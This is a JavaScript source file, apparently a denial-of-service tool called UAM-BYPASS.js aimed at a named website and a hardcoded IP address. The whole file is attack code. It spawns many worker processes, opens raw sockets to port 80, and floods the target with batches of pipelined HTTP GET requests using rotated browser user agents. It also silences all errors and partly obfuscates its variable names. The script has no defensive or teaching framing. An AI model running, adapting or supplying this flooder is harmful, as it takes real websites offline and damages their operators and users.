const fs = require('fs'),
  url = require('url'),
  net = require('net'),
  cluster = require('cluster')
process.argv.length <= 3 &&
  (console.log(
    'Bypass UAM https://stargate.cam only XD \n node UAM-BYPASS.js https://stargate.cam <threads> <time>'
  ),
  process.exit(-1))
var target = process.argv[2]
target === 'https://stargate.cam' && (target = 'http://45.95.55.105/')
var parsed = url.parse(target),
  host = url.parse(target).host,
  threads = process.argv[3],
  time = process.argv[4]
require('events').EventEmitter.defaultMaxListeners = 0
process.setMaxListeners(0)
process.on('uncaughtException', function (_0x11d3fc) {})
process.on('unhandledRejection', function (_0x1fba62) {})
const userAgents = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0;  rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)',
  ],
  nullHexs = ['\0', '\uFFFD', '\uFFFD', '\xA0']
if (cluster.isMaster) {
  for (let i = 0; i < threads; i++) {
    cluster.fork()
    console.log('(!) Creating ' + i + ' thread')
  }
  console.log('(!) Successfully started.')
  setTimeout(() => {
    process.exit(1)
  }, time * 1000)
} else {
  startflood()
}
function startflood() {
  var _0x88205e = setInterval(() => {
    var _0x94b5ab = require('net').Socket()
    _0x94b5ab.connect(80, host)
    _0x94b5ab.setTimeout(20000)
    for (var _0x49827f = 0; _0x49827f < 64; _0x49827f++) {
      _0x94b5ab.write(
        'GET ' +
          target +
          ' HTTP/1.1\r\nHost: ' +
          parsed.host +
          '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' +
          userAgents[Math.floor(Math.random() * userAgents.length)] +
          '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'
      )
    }
    _0x94b5ab.on('data', function () {
      setTimeout(function () {
        return _0x94b5ab.destroy(), delete _0x94b5ab
      }, 5000)
    })
  })
  setTimeout(() => clearInterval(_0x88205e), time * 10000)
}
